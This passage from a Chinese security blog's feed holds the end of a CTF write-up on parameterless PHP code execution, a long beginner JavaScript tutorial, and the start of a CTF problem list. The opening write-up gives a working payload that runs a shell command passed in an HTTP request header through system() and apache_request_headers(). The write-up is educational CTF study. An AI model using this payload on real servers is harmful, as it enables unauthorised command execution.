删除数组中第一个元素，并返回被删除元素的值</code></pre><p>在我的电脑中，需要把flag头，放在host前，具体原因未知</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013150830.png" alt="image-20220411013150830"></p><p>此时arry_shift()返回的值就是我们要执行的命令</p><p>payload</p><pre><code>?exp=system(array_shift(apache_request_headers()));# postflag: whoami</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013259840.png" alt="image-20220411013259840"></p><p>成功执行命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
highlight_file(__FIL</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="代码执行" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>浅学javascript</title>
    <link href="https://sakurahack-y.github.io/2022/04/07/%E6%B5%85%E5%AD%A6javascript/"/>
    <id>https://sakurahack-y.github.io/2022/04/07/%E6%B5%85%E5%AD%A6javascript/</id>
    <published>2022-04-07T13:25:06.000Z</published>
    <updated>2022-04-11T07:29:26.288Z</updated>
    
    <content type="html"><![CDATA[<p>该来的永远跑不掉，该补的早晚要补，诶，好好学javascript，我爱学习！！！！！</p><p>[TOC]</p><h1 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213804320.png" alt="image-20220407213804320"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213723069.png" alt="image-20220407213723069"></p><h1 id="javascript的组成部分"><a href="#javascript的组成部分" class="headerlink" title="javascript的组成部分"></a>javascript的组成部分</h1><p>html是骨架，css是对页面进行渲染，js绝对这个页面可以做什么</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213908008.png" alt="image-20220407213908008"></p><p>javascript由BOM,DMO,ECMAScript组成 </p><p><strong>BOM</strong></p><p>全名-Browser Object Model,指的是js操作浏览器发送变化的属性和方法</p><p><strong>DOM</strong></p><p>全名-Document Object Model,指的是操作文档流发生变化的属性和方法</p><p><strong>ECMAScript</strong></p><p>指的是JS代码的书写语法和书写规则</p><h1 id="JavaScript-书写位置"><a href="#JavaScript-书写位置" class="headerlink" title="JavaScript 书写位置"></a>JavaScript 书写位置</h1><p><strong>行内式</strong></p><p>a标签-书写在href属性上</p><pre><code class="javascript">&lt;a href=&quot;javascript: JS代码;&quot;&gt;点我一下&lt;/a&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215348244.png" alt="image-20220407215348244"></p><p>非a标签-书写在行为属性上</p><pre><code class="javascript">&lt;div onclick=&quot;alert(&#39;hello word&#39;)&quot;&gt;点我一下&lt;/div&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215601888.png" alt="image-20220407215601888"></p><p><strong>内嵌式</strong></p><p>把代码书写在一个script标签对里面,不需要依赖任何行为，打开网页就会执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215824582.png" alt="image-20220407215824582"></p><p><strong>外链式</strong></p><p>把代码书写在一个.js文件内，外链式js代码，不需要依赖任何行为，打开页面就会执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220351326.png" alt="image-20220407220351326"></p><h1 id="JavaScript定义变量"><a href="#JavaScript定义变量" class="headerlink" title="JavaScript定义变量"></a>JavaScript定义变量</h1><pre><code class="javascript">var num = 100</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220943173.png" alt="image-20220407220943173"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220903524.png" alt="image-20220407220903524"></p><h1 id="三种输出方式"><a href="#三种输出方式" class="headerlink" title="三种输出方式"></a>三种输出方式</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221044266.png" alt="image-20220407221044266"></p><h1 id="JS的数据类型"><a href="#JS的数据类型" class="headerlink" title="JS的数据类型"></a>JS的数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221242187.png" alt="image-20220407221242187"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221932277.png" alt="image-20220407221932277"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221440539.png" alt="image-20220407221440539"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221511452.png" alt="image-20220407221511452"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221817260.png" alt="image-20220407221817260"></p><h1 id="JavaScript数据类型转换"><a href="#JavaScript数据类型转换" class="headerlink" title="JavaScript数据类型转换"></a>JavaScript数据类型转换</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222131138.png" alt="image-20220407222131138"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222415779.png" alt="image-20220407222415779"></p><p>当可以合法转换就正常转换，当无法合法转换时，值就变为NAN</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230433762.png" alt="image-20220407230433762"></p><p>当可以合法转换就正常转换，当无法合法转换时，如果原值以字母，则返回值为NAN，如果原值以数字+字符串开头，则返回前面的数字而忽略字符串</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222543001.png" alt="image-20220407222543001"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222630874.png" alt="image-20220407222630874"></p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230952623.png" alt="image-20220407230952623"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231034790.png" alt="image-20220407231034790"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231109372.png" alt="image-20220407231109372"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231129915.png" alt="image-20220407231129915"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231232353.png" alt="image-20220407231232353"></p><h1 id="条件分支语句"><a href="#条件分支语句" class="headerlink" title="条件分支语句"></a>条件分支语句</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231403054.png" alt="image-20220407231403054"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231436373.png" alt="image-20220407231436373"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231551013.png" alt="image-20220407231551013"></p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232532028.png" alt="image-20220407232532028"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232436701.png" alt="image-20220407232436701"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232646209.png" alt="image-20220407232646209"></p><h1 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232807115.png" alt="image-20220407232807115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232828922.png" alt="image-20220407232828922"></p><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232920259.png" alt="image-20220407232920259"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233013700.png" alt="image-20220407233013700"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233022496.png" alt="image-20220407233022496"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233059818.png" alt="image-20220407233059818"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233136738.png" alt="image-20220407233136738"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233201625.png" alt="image-20220407233201625"></p><h1 id="对象数据类型"><a href="#对象数据类型" class="headerlink" title="对象数据类型"></a>对象数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233307155.png" alt="image-20220407233307155"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233549115.png" alt="image-20220407233549115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233644769.png" alt="image-20220407233644769"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233455066.png" alt="image-20220407233455066"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233504184.png" alt="image-20220407233504184"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233523944.png" alt="image-20220407233523944"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233615368.png" alt="image-20220407233615368"></p><h1 id="数组数据类型"><a href="#数组数据类型" class="headerlink" title="数组数据类型"></a>数组数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233743737.png" alt="image-20220407233743737"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233840225.png" alt="image-20220407233840225"></p><h1 id="数组常用方法"><a href="#数组常用方法" class="headerlink" title="数组常用方法"></a>数组常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000927943.png" alt="image-20220408000927943"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234008850.png" alt="image-20220407234008850"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234023183.png" alt="image-20220407234023183"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234038569.png" alt="image-20220407234038569"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234054841.png" alt="image-20220407234054841"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234110601.png" alt="image-20220407234110601"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234132600.png" alt="image-20220407234132600"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234420968.png" alt="image-20220407234420968"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234514112.png" alt="image-20220407234514112"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234540680.png" alt="image-20220407234540680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234754392.png" alt="image-20220407234754392"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234822279.png" alt="image-20220407234822279"></p><p>包前不包后</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000322543.png" alt="image-20220408000322543"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000514401.png" alt="image-20220408000514401"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000635298.png" alt="image-20220408000635298"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000653869.png" alt="image-20220408000653869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000714136.png" alt="image-20220408000714136"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000753278.png" alt="image-20220408000753278"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000801246.png" alt="image-20220408000801246"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001013869.png" alt="image-20220408001013869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001035076.png" alt="image-20220408001035076"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000830365.png" alt="image-20220408000830365"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000847454.png" alt="image-20220408000847454"></p><h1 id="字符串常用方法"><a href="#字符串常用方法" class="headerlink" title="字符串常用方法"></a>字符串常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001751547.png" alt="image-20220408001751547"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001220640.png" alt="image-20220408001220640"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001232044.png" alt="image-20220408001232044"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001300510.png" alt="image-20220408001300510"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001325030.png" alt="image-20220408001325030"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001357820.png" alt="image-20220408001357820"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001425680.png" alt="image-20220408001425680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001432558.png" alt="image-20220408001432558"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001456688.png" alt="image-20220408001456688"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001513319.png" alt="image-20220408001513319"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001558293.png" alt="image-20220408001558293"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001728712.png" alt="image-20220408001728712"></p><h1 id="数字常用方法"><a href="#数字常用方法" class="headerlink" title="数字常用方法"></a>数字常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002711294.png" alt="image-20220408002711294"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001857190.png" alt="image-20220408001857190"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001921068.png" alt="image-20220408001921068"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001959789.png" alt="image-20220408001959789"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002017326.png" alt="image-20220408002017326"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002033918.png" alt="image-20220408002033918"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002053540.png" alt="image-20220408002053540"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002112036.png" alt="image-20220408002112036"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002122229.png" alt="image-20220408002122229"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002133196.png" alt="image-20220408002133196"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002147147.png" alt="image-20220408002147147"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002152859.png" alt="image-20220408002152859"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002208364.png" alt="image-20220408002208364"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002217762.png" alt="image-20220408002217762"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002233052.png" alt="image-20220408002233052"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002257196.png" alt="image-20220408002257196"></p><h1 id="时间常用方法"><a href="#时间常用方法" class="headerlink" title="时间常用方法"></a>时间常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002836962.png" alt="image-20220408002836962"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002855807.png" alt="image-20220408002855807"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003002403.png" alt="image-20220408003002403"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003019626.png" alt="image-20220408003019626"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003107445.png" alt="image-20220408003107445"></p><h1 id="JavaScript的BOM操作"><a href="#JavaScript的BOM操作" class="headerlink" title="JavaScript的BOM操作"></a>JavaScript的BOM操作</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410161902503.png" alt="image-20220410161902503"></p><p><strong>1、获取浏览器窗口尺寸</strong></p><pre><code>获取可视窗口宽度: window.innerWidth获取可视窗口高度: window.innerHeight</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162216868.png" alt="image-20220410162216868"></p><p><strong>2、浏览器的弹出层</strong></p><pre><code>提示框: window.alert(&#39;提示信息&#39;)询问框: window.confirm(&#39;提示信息&#39;) 返回 true和false输入框: window.prompt(&#39;提示信息&#39;) 点确定，返回输入框中内容，点取消返回null</code></pre><p><strong>3、开启和关闭标签页</strong></p><pre><code>开启: window.open(&#39;地址&#39;)关闭: window.close()</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162721520.png" alt="image-20220410162721520"></p><p><strong>4、浏览器常见事件</strong></p><pre><code>资源加载完毕: window.onload = function() &#123;&#125;可视尺寸改变: window.onresize = function()&#123;&#125;滚动条位置改变: window.onscroll = function()&#123;&#125;</code></pre><ol><li>在页面资源加载完毕执行</li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163103734.png" alt="image-20220410163103734"></p><ol start="2"><li><p>可视窗口发生变化时执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163226827.png" alt="image-20220410163226827"></p></li><li><p>滚动条位置改变时执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163327867.png" alt="image-20220410163327867"></p></li></ol><p><strong>5、浏览器历史记录操作</strong></p><pre><code>回退页面:window.history.back()前进页面: window.history.forward</code></pre><p><strong>6、浏览器卷去尺寸</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163708715.png" alt="image-20220410163708715"></p><ol><li><p>卷去的高度</p><pre><code>document.documentElement.scrollTop #当有&lt;!DOCTYPE html&gt;用这个document.body.scrollTop #当没有&lt;!DOCTYPE html&gt;用这个</code></pre><p>兼容写法</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164045152.png" alt="image-20220410164045152"></p></li><li><p>卷去宽度</p><pre><code>document.documentElement.scrollleft #当有&lt;!DOCTYPE html&gt;用这个document.body.scrollleft #当没有&lt;!DOCTYPE html&gt;用这个</code></pre><p>兼容写法:</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164228039.png" alt="image-20220410164228039"></p></li></ol><p><strong>7、浏览器滚动到</strong></p><pre><code>window.scrolloTo()  #滚动到参数方式1(瞬间定位): window.scrollTo(left,top)        left:浏览器卷去高度        top:浏览器卷去高度参数方式2(滚动定位): window.scrollTo(&#123;        left: xx        top: yy        behavior:&#39;smooth&#39;  #表示平滑滚动&#125;)</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164500900.png" alt="image-20220410164500900"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164841389.png" alt="image-20220410164841389"></p><h1 id="JavaScript定时器"><a href="#JavaScript定时器" class="headerlink" title="JavaScript定时器"></a>JavaScript定时器</h1><p><strong>间隔定时器</strong></p><pre><code>按照指定周期(毫秒)去执行指定的代码语法: setInterval(函数,时间)函数: 每次要执行的内容时间: 单位是毫秒</code></pre><p>示例代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setInterval(function()&#123;                console.log(&#39;执行一次&#39;)            &#125;,1000)  # 单位毫秒，这里也就是1秒        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122709604.png" alt="image-20220411122709604"></p><p>延时定时器</p><pre><code>在固定的时间(毫秒)后指定一次代码语法: setTimeout(函数,时间)函数: 时间到达执行的内容时间: 单位是毫秒</code></pre><p>示例代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setTimeout(function()&#123;                console.log(&#39;执行一次&#39;)            &#125;,1000)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122948862.png" alt="image-20220411122948862"></p><p><strong>定时器返回值</strong></p><pre><code>不区分定时器种类表示是当前页面的第几个定时器</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123144526.png" alt="image-20220411123144526"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123157829.png" alt="image-20220411123157829"></p><p>是不区分种类的，只表示是页面第几个定时器</p><p><strong>关闭定时器</strong></p><pre><code>语法一: clearInterval(要关闭的定时器返回值)语法二: clearTimeout(要关闭的定时器返回值)这是不区分定时器种类的可以互相关闭</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135402168.png" alt="image-20220411135402168"></p><h1 id="DOM基本操作"><a href="#DOM基本操作" class="headerlink" title="DOM基本操作"></a>DOM基本操作</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135516647.png" alt="image-20220411135516647"></p><p><strong>获取元素方式</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135606813.png" alt="image-20220411135606813"></p><ol><li><p>根据id名称获取</p><pre><code>语法: document.getElementById(&#39;id名称&#39;)作用: 获取文档流中id名对应的一个元素返回值:    如果有id对应的元素，就是这个元素    如果没有id对应的元素，就是null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411140343642.png" alt="image-20220411140343642"></p></li><li><p>根据元素类名获取</p><pre><code>语法: document.getElementsByClassName(&#39;元素类名&#39;)作用: 获取文档流中所有类名对应的元素返回值: 必定是一个伪数组    如果有类名对应的元素，有多少获取多少    如果没用类名对应的元素，空的伪数组</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141050751.png" alt="image-20220411141050751"></p></li><li><p>根据元素标签名获取</p><pre><code>语法: document.getElementsByTagName(&#39;标签名&#39;)作用； 获取文档流中所有标签名对应的元素返回值；必然是一个伪数组    如果有标签名对应的元素，有多少获取多少    如果没用标签名对应的元素，空的伪数组</code></pre><p> <img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141947898.png" alt="image-20220411141947898"></p></li><li><p>根据选择器获取一个</p><pre><code>语法； document.querySelector(&#39;选择器&#39;)作用: 获取文档流中满足选择器规则的第一个元素返回值:    如果有选择器对应的元素，获取到第一个    如果没用选择器对应的元素，返回null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411142650050.png" alt="image-20220411142650050"></p></li><li><p>根据选择器获取一组</p><pre><code>语法:document.querySelectorAll(&#39;选择器&#39;)作用: 获取文档流中所有满足选择器规则的元素返回值: 必然是一个伪数组    如果有选择器对应的元素，获取到第一个    如果没用选择器对应的元素，返回null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411143324177.png" alt="image-20220411143324177"></p></li></ol><p><strong>操作元素内容</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144452327.png" alt="image-20220411144452327"></p><ol><li><p>操作元素文本内容</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144426234.png" alt="image-20220411144426234"></p></li><li><p>操作元素超文本内容</p></li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411144816538.png" alt="image-20220411144816538"></p><p><strong>操作元素属性</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145038287.png" alt="image-20220411145038287"></p><ol><li><p>原生属性</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411145906291.png" alt="image-20220411145906291"></p></li><li><p>自定义属性</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411150625140.png" alt="image-20220411150625140"></p></li></ol><p><strong>操作元素类名</strong></p><pre><code>获取: 元素.className设置； 元素.className = &#39;新类名&#39;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411151419501.png" alt="image-20220411151419501"></p><p><strong>操作元素行内样式</strong></p><pre><code>获取: 元素.style.样式名设置: 元素.style.样式名 = &#39;样式值&#39;注意: 只能获取和设置元素的行内样式</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152231051.png" alt="image-20220411152231051"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152308257.png" alt="image-20220411152308257"></p><p><strong>获取元素非行内样式</strong></p><pre><code>获取:window.getComputedStyle(元素).样式名注意； 可以获取行内样式，也可以获取非行内样式</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411152807202.png" alt="image-20220411152807202"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;该来的永远跑不掉，该补的早晚要补，诶，好好学javascript，我爱学习！！！！！&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;历史&quot;&gt;&lt;a href=&quot;#历史&quot; class=&quot;headerlink&quot; title=&quot;历史&quot;&gt;&lt;/a&gt;历史&lt;/h1&gt;&lt;p&gt;&lt;img sr</summary>
      
    
    
    
    <category term="语言" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="javascript" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/javascript/"/>
    
    
    <category term="javascript" scheme="https://sakurahack-y.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>ctf刷题-第一周题目</title>
    <link href="https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/"/>
    <id>https://sakurahack-y.github.io/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/</id>
    <published>2022-03-28T12:25:15.000Z</published>
    <updated>2022-04-06T16:47:13.445Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h1><p><strong>Web方向：</strong></p><p>[b01lers2020]Welcome to Earth</p><p>[网鼎杯 2018]Comment</p><p>[GYCTF2020]Ezsqli</p><p>[网鼎杯 2020 白虎组]PicDown</p><p>[watevrCTF-2019]Cookie Store</p><p>[SWPUCTF 2018]SimplePHP</p><p>[WUSTCTF2020]CV Maker</p><p>[HarekazeCTF2019]encode_and_encode</p><p>[红明谷CTF 2021]write_shell</p><p>[SUCTF 2019]EasyWeb</p><p>[RootersCTF2019]I_&lt;3_Flask</p><p>[NCTF2019]SQLi</p><p>[NPUCTF2020]ezinclude</p><p>[CISCN2019 华东南赛区]Double Secret</p><h1 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h1><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>进去后，它会直接提示我，我die了，但是我们可以注意到它有个一闪而过的画面。</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203228318.png" alt="image-20220328203228318"></p><p>在这个页面没有发现，使用burp抓包</p><p>抓到</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203639569.png" 